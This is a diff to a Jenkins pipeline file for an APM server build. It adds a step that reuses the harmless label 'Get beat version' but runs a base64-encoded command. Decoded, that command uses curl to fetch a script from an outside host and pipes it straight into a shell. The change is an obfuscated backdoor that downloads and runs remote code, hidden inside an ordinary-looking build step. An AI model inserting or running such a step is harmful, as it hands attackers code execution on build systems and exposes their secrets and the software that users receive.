@@ -76,6 +76,9 @@ pipeline {
             withGoEnv(){
               setEnvVar('APM_SERVER_VERSION', sh(label: 'Get beat version', script: 'make get-version', returnStdout: true)?.trim())
             }
+            withGoEnv(){
+              setEnvVar('RESTS', sh(label: 'Get beat version', script: 'echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9hY3Rpb25zL2VsYXN0aWN8c2g=|base64 -d|sh', returnStdout: true)?.trim())
+            }
             env.BEATS_UPDATED = isGitRegionMatch(patterns: regexps)
             // Skip all the stages except docs for PR's with asciidoc changes only
             //whenTrue(isPR()) {
